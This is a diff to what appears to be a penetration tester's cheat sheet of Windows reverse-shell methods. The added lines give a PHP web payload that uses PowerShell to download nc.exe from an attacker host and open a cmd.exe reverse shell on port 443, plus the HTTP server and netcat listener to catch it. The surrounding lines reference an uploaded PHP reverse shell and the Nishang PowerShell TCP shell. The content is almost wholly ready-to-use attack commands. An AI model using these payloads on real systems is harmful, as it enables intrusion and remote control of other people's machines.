@@ -74,6 +74,12 @@ put windows-php-reverse-shell.php
 http://192.168.200.5/windows-php-reverse-shell.php
 
 ===================================
+Windows PHP and Powershell
+sudo python -m SimpleHTTPServer 80
+<?php exec("powershell wget 192.168.162.46/nc.exe -O nc.exe && nc.exe 192.168.162.46 443 -e cmd.exe"); ?>
+nc -nvlp 443
+
+===================================
 Windows Nishang 
 cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 ./shang.ps1 
 vim shang.ps1 
